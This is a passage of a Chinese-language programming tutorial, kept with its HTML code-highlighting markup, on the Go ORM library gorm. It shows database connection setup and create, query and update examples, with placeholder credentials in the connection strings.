class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">"github.com/jinzhu/gorm/dialects/mysql"</span></span><br><span class="line"><span class="string">"github.com/jinzhu/gorm"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">db, err := gorm.Open(<span class="string">"mysql"</span>, <span class="string">"root:123456@/user?charset=utf8&amp;parseTime=True&amp;loc=Local"</span>)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>{</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>PostgreSQL<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">"github.com/jinzhu/gorm/dialects/postgres"</span></span><br><span class="line"><span class="string">"github.com/jinzhu/gorm"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">db, err := gorm.Open(<span class="string">"postgres"</span>, <span class="string">"host=myhost user=gorm dbname=gorm sslmode=disable password=mypassword"</span>)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>{</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>SQLite3<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"github.com/jinzhu/gorm"</span></span><br><span class="line">    _ <span class="string">"github.com/jinzhu/gorm/dialects/sqlite"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">  db, err := gorm.Open(<span class="string">"sqlite3"</span>, <span class="string">"./test.db"</span>)</span><br><span class="line">  <span class="keyword">if</span> err!=<span class="literal">nil</span>{</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="判断表是否存在"><a href="#判断表是否存在" class="headerlink" title="判断表是否存在"></a>判断表是否存在</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查模型`User`表是否存在</span></span><br><span class="line">db.HasTable(&amp;User{})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查表`users`是否存在</span></span><br><span class="line">db.HasTable(<span class="string">"users"</span>)</span><br></pre></td></tr></tbody></table></figure><h2 id="CRUD"><a href="#CRUD" class="headerlink" title="CRUD"></a>CRUD</h2><h3 id="创建记录"><a href="#创建记录" class="headerlink" title="创建记录"></a>创建记录</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> zhangsan =User{</span><br><span class="line">Username: <span class="string">"zhangsan"</span>,</span><br><span class="line">Password: <span class="string">"abc"</span>,</span><br><span class="line">Email:    <span class="string">"abv@qq.com"</span>,</span><br><span class="line">Blog:     <span class="string">"abc"</span>,</span><br><span class="line">Phone:    <span class="number">1111111</span>,</span><br><span class="line">}</span><br><span class="line">db.NewRecord(zhangsan)</span><br><span class="line">db.Create(&amp;zhangsan) <span class="comment">//传入的必须指针类型，否则不会创建记录</span></span><br></pre></td></tr></tbody></table></figure><p>我们通过<code>db.NewRecord</code>来判断是否插入成功，成功则放回<code>false</code>，失败则返回<code>true</code>。</p><p>默认值</p><p>我们可以通过tag设置默认值，<strong>PS: 只有在建表有效，不能在建表之后在使用</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">gorm.Model</span><br><span class="line">Username <span class="keyword">string</span> <span class="string">`gorm:"column:username"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`gorm:"column:password"`</span></span><br><span class="line">Email <span class="keyword">string</span></span><br><span class="line">Blog <span class="keyword">string</span> <span class="string">`gorm:"default:'test@test.com'"`</span></span><br><span class="line">Phone <span class="keyword">uint</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取第一条记录，按主键排序</span></span><br><span class="line">db.First(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users ORDER BY id LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一条记录，不指定排序</span></span><br><span class="line">db.Take(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取最后一条记录，按主键排序</span></span><br><span class="line">db.Last(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users ORDER BY id DESC LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有的记录</span></span><br><span class="line">db.Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过主键进行查询 (仅适用于主键是数字类型)</span></span><br><span class="line">db.First(&amp;user, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br></pre></td></tr></tbody></table></figure><p>Where<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取第一条匹配的记录</span></span><br><span class="line">db.Where(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).First(&amp;user)</span><br><span class="line"><span class="comment">//// SELECT * FROM users WHERE name = 'jinzhu' limit 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有匹配的记录</span></span><br><span class="line">db.Where(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">//// SELECT * FROM users WHERE name = 'jinzhu';</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &lt;&gt;</span></span><br><span class="line">db.Where(<span class="string">"name &lt;&gt; ?"</span>, <span class="string">"jinzhu"</span>).Find(&amp;users)</span><br><span class="line"></span><br><span class="line"><span class="comment">// IN</span></span><br><span class="line">db.Where(<span class="string">"name in (?)"</span>, []<span class="keyword">string</span>{<span class="string">"jinzhu"</span>, <span class="string">"jinzhu 2"</span>}).Find(&amp;users)</span><br><span class="line"></span><br><span class="line"><span class="comment">// LIKE</span></span><br><span class="line">db.Where(<span class="string">"name LIKE ?"</span>, <span class="string">"%jin%"</span>).Find(&amp;users)</span><br><span class="line"></span><br><span class="line"><span class="comment">// AND</span></span><br><span class="line">db.Where(<span class="string">"name = ? AND age &gt;= ?"</span>, <span class="string">"jinzhu"</span>, <span class="string">"22"</span>).Find(&amp;users)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Time</span></span><br><span class="line">db.Where(<span class="string">"updated_at &gt; ?"</span>, lastWeek).Find(&amp;users)</span><br><span class="line"></span><br><span class="line"><span class="comment">// BETWEEN</span></span><br><span class="line">db.Where(<span class="string">"created_at BETWEEN ? AND ?"</span>, lastWeek, today).Find(&amp;users)</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用struct和map<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Struct &amp; Map</span><br><span class="line"><span class="comment">// Struct</span></span><br><span class="line">db.Where(&amp;User{Name: <span class="string">"jinzhu"</span>, Age: <span class="number">20</span>}).First(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20 LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Map</span></span><br><span class="line">db.Where(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{<span class="string">"name"</span>: <span class="string">"jinzhu"</span>, <span class="string">"age"</span>: <span class="number">20</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多主键 slice 查询</span></span><br><span class="line">db.Where([]<span class="keyword">int64</span>{<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id IN (20, 21, 22);</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>PS：这里要注意的一点是，查询条件不会包含<code>"",0,false</code>和其它空值，例如：<code>db.Where(&amp;User{Username:"lisi",Password:""}).Find(&amp;u)</code>里面的<code>password=""</code>，是不会带入查询条件中的</p><p><strong>Not</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">db.Not(<span class="string">"name"</span>, <span class="string">"jinzhu"</span>).First(&amp;user)</span><br><span class="line"><span class="comment">//// SELECT * FROM users WHERE name &lt;&gt; "jinzhu" LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不包含</span></span><br><span class="line">db.Not(<span class="string">"name"</span>, []<span class="keyword">string</span>{<span class="string">"jinzhu"</span>, <span class="string">"jinzhu 2"</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">//// SELECT * FROM users WHERE name NOT IN ("jinzhu", "jinzhu 2");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不在主键 slice 中</span></span><br><span class="line">db.Not([]<span class="keyword">int64</span>{<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>}).First(&amp;user)</span><br><span class="line"><span class="comment">//// SELECT * FROM users WHERE id NOT IN (1,2,3);</span></span><br><span class="line"></span><br><span class="line">db.Not([]<span class="keyword">int64</span>{}).First(&amp;user)</span><br><span class="line"><span class="comment">//// SELECT * FROM users;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原生 SQL</span></span><br><span class="line">db.Not(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).First(&amp;user)</span><br><span class="line"><span class="comment">//// SELECT * FROM users WHERE NOT(name = "jinzhu");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Struct</span></span><br><span class="line">db.Not(User{Name: <span class="string">"jinzhu"</span>}).First(&amp;user)</span><br><span class="line"><span class="comment">//// SELECT * FROM users WHERE name &lt;&gt; "jinzhu";</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>OR</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db.Where(<span class="string">"role = ?"</span>, <span class="string">"admin"</span>).Or(<span class="string">"role = ?"</span>, <span class="string">"super_admin"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE role = 'admin' OR role = 'super_admin';</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Struct</span></span><br><span class="line">db.Where(<span class="string">"name = 'jinzhu'"</span>).Or(User{Name: <span class="string">"jinzhu 2"</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = 'jinzhu' OR name = 'jinzhu 2';</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Map</span></span><br><span class="line">db.Where(<span class="string">"name = 'jinzhu'"</span>).Or(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{<span class="string">"name"</span>: <span class="string">"jinzhu 2"</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = 'jinzhu' OR name = 'jinzhu 2';</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>行内条件查询</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过主键进行查询 (仅适用于主键是数字类型)</span></span><br><span class="line">db.First(&amp;user, <span class="number">23</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 23 LIMIT 1;</span></span><br><span class="line"><span class="comment">// 非数字类型的主键查询</span></span><br><span class="line">db.First(&amp;user, <span class="string">"id = ?"</span>, <span class="string">"string_primary_key"</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 'string_primary_key' LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原生 SQL</span></span><br><span class="line">db.Find(&amp;user, <span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = "jinzhu";</span></span><br><span class="line"></span><br><span class="line">db.Find(&amp;users, <span class="string">"name &lt;&gt; ? AND age &gt; ?"</span>, <span class="string">"jinzhu"</span>, <span class="number">20</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name &lt;&gt; "jinzhu" AND age &gt; 20;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Struct</span></span><br><span class="line">db.Find(&amp;users, User{Age: <span class="number">20</span>})</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE age = 20;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Map</span></span><br><span class="line">db.Find(&amp;users, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{<span class="string">"age"</span>: <span class="number">20</span>})</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE age = 20;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>FirstOrInit</strong></p><blockquote><p>获取第一条匹配的记录，或者通过给定的条件下初始一条新的记录（仅适用与于 struct 和 map 条件）。还要注意的几点是：这个不会在数据库里面增加记录，只是会改变传入的结构体的值，而且不支持结构体数组</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未查询到</span></span><br><span class="line">db.FirstOrInit(&amp;user, User{Name: <span class="string">"non_existing"</span>})</span><br><span class="line"><span class="comment">// user -&gt; User{Name: "non_existing"}</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询到</span></span><br><span class="line">db.Where(User{Name: <span class="string">"Jinzhu"</span>}).FirstOrInit(&amp;user)</span><br><span class="line"><span class="comment">// user -&gt; User{Id: 111, Name: "Jinzhu", Age: 20}</span></span><br><span class="line">db.FirstOrInit(&amp;user, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{<span class="string">"name"</span>: <span class="string">"jinzhu"</span>})</span><br><span class="line"><span class="comment">// user -&gt; User{Id: 111, Name: "Jinzhu", Age: 20}</span></span><br></pre></td></tr></tbody></table></figure><p><strong>Attrs</strong><br>如果未找到记录，则使用参数初始化 struct<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未查询到</span></span><br><span class="line">db.Where(User{Name: <span class="string">"non_existing"</span>}).Attrs(User{Age: <span class="number">20</span>}).FirstOrInit(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM USERS WHERE name = 'non_existing';</span></span><br><span class="line"><span class="comment">// user -&gt; User{Name: "non_existing", Age: 20}</span></span><br><span class="line"></span><br><span class="line">db.Where(User{Name: <span class="string">"non_existing"</span>}).Attrs(<span class="string">"age"</span>, <span class="number">20</span>).FirstOrInit(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM USERS WHERE name = 'non_existing';</span></span><br><span class="line"><span class="comment">// user -&gt; User{Name: "non_existing", Age: 20}</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询到</span></span><br><span class="line">db.Where(User{Name: <span class="string">"Jinzhu"</span>}).Attrs(User{Age: <span class="number">30</span>}).FirstOrInit(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM USERS WHERE name = jinzhu';</span></span><br><span class="line"><span class="comment">// user -&gt; User{Id: 111, Name: "Jinzhu", Age: 20}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Assign</strong></p><blockquote><p>无论是否查询到数据，都将参数赋值给 struct</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未查询到</span></span><br><span class="line">db.Where(User{Name: <span class="string">"non_existing"</span>}).Assign(User{Age: <span class="number">20</span>}).FirstOrInit(&amp;user)</span><br><span class="line"><span class="comment">// user -&gt; User{Name: "non_existing", Age: 20}</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询到</span></span><br><span class="line">db.Where(User{Name: <span class="string">"Jinzhu"</span>}).Assign(User{Age: <span class="number">30</span>}).FirstOrInit(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM USERS WHERE name = jinzhu';</span></span><br><span class="line"><span class="comment">// user -&gt; User{Id: 111, Name: "Jinzhu", Age: 30}</span></span><br></pre></td></tr></tbody></table></figure><p><strong>FirstOrCreate</strong></p><blockquote><p>获取第一条匹配的记录，或者通过给定的条件创建一条记录 （仅适用与于 struct 和 map 条件）。</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未查询到</span></span><br><span class="line">db.FirstOrCreate(&amp;user, User{Name: <span class="string">"non_existing"</span>})</span><br><span class="line"><span class="comment">// INSERT INTO "users" (name) VALUES ("non_existing");</span></span><br><span class="line"><span class="comment">// user -&gt; User{Id: 112, Name: "non_existing"}</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询到</span></span><br><span class="line">db.Where(User{Name: <span class="string">"Jinzhu"</span>}).FirstOrCreate(&amp;user)</span><br><span class="line"><span class="comment">// user -&gt; User{Id: 111, Name: "Jinzhu"}</span></span><br></pre></td></tr></tbody></table></figure><p><strong>指定字段查询</strong></p><blockquote><p>指定要从数据库检索的字段，默认情况下，将选择所有字段。</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">db.Select(<span class="string">"name, age"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">//// SELECT name, age FROM users;</span></span><br><span class="line"></span><br><span class="line">db.Select([]<span class="keyword">string</span>{<span class="string">"name"</span>, <span class="string">"age"</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">//// SELECT name, age FROM users;</span></span><br><span class="line"></span><br><span class="line">db.Table(<span class="string">"users"</span>).Select(<span class="string">"COALESCE(age,?)"</span>, <span class="number">42</span>).Rows()</span><br><span class="line"><span class="comment">//// SELECT COALESCE(age,'42') FROM users;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>Order</strong></p><blockquote><p>使用 Order 从数据库查询记录时，当第二个参数设置为 true 时，将会覆盖之前的定义条件。</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">db.Order(<span class="string">"age desc, name"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">//// SELECT * FROM users ORDER BY age desc, name;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个排序条件</span></span><br><span class="line">db.Order(<span class="string">"age desc"</span>).Order(<span class="string">"name"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">//// SELECT * FROM users ORDER BY age desc, name;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新排序</span></span><br><span class="line">db.Order(<span class="string">"age desc"</span>).Find(&amp;users1).Order(<span class="string">"age"</span>, <span class="literal">true</span>).Find(&amp;users2)</span><br><span class="line"><span class="comment">//// SELECT * FROM users ORDER BY age desc; (users1)</span></span><br><span class="line"><span class="comment">//// SELECT * FROM users ORDER BY age; (users2)</span></span><br></pre></td></tr></tbody></table></figure><p><strong>Limit</strong></p><blockquote><p>指定要查询的最大记录数</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">db.Limit(<span class="number">3</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">//// SELECT * FROM users LIMIT 3;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 -1 取消 LIMIT 限制条件</span></span><br><span class="line">db.Limit(<span class="number">10</span>).Find(&amp;users1).Limit(<span class="number">-1</span>).Find(&amp;users2)</span><br><span class="line"><span class="comment">//// SELECT * FROM users LIMIT 10; (users1)</span></span><br><span class="line"><span class="comment">//// SELECT * FROM users; (users2)</span></span><br></pre></td></tr></tbody></table></figure><p><strong>Count</strong></p><blockquote><p>获取模型记录数，这个传入的是整形</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.Where(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).Or(<span class="string">"name = ?"</span>, <span class="string">"jinzhu 2"</span>).Find(&amp;users).Count(&amp;count)</span><br><span class="line"><span class="comment">// SELECT * from USERS WHERE name = 'jinzhu' OR name = 'jinzhu 2'; (users)</span></span><br><span class="line"><span class="comment">// SELECT count(*) FROM users WHERE name = 'jinzhu' OR name = 'jinzhu 2'; (count)</span></span><br><span class="line"></span><br><span class="line">db.Model(&amp;User{}).Where(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).Count(&amp;count)</span><br><span class="line"><span class="comment">// SELECT count(*) FROM users WHERE name = 'jinzhu'; (count)</span></span><br><span class="line"></span><br><span class="line">db.Table(<span class="string">"deleted_users"</span>).Count(&amp;count)</span><br><span class="line"><span class="comment">// SELECT count(*) FROM deleted_users;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>Scan</strong></p><blockquote><p>将 Scan 查询结果放入另一个结构体中。</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Result <span class="keyword">struct</span> {</span><br><span class="line">    Name <span class="keyword">string</span></span><br><span class="line">    Age  <span class="keyword">int</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result Result</span><br><span class="line">db.Table(<span class="string">"users"</span>).Select(<span class="string">"name, age"</span>).Where(<span class="string">"name = ?"</span>, <span class="number">3</span>).Scan(&amp;result)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Raw SQL</span></span><br><span class="line">db.Raw(<span class="string">"SELECT name, age FROM users WHERE name = ?"</span>, <span class="number">3</span>).Scan(&amp;result)</span><br></pre></td></tr></tbody></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p><strong>更新所有字段</strong><br>Save 方法在执行 SQL 更新操作时将包含所有字段，即使这些字段没有被修改。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db.First(&amp;user)</span><br><span class="line">user.Name = <span class="string">"jinzhu 2"</span></span><br><span class="line">user.Age = <span class="number">100</span></span><br><span class="line">db.Save(&amp;user)</span><br><span class="line"><span class="comment">// UPDATE users SET name='jinzhu 2', age=100, birthday='2016-01-01', updated_at = '2013-11-17 21:34:10' WHERE id=111;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>更新已更改的字段</p><blockquote><p>如果你只想更新已经修改了的字段，可以使用 Update，Updates 方法。</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 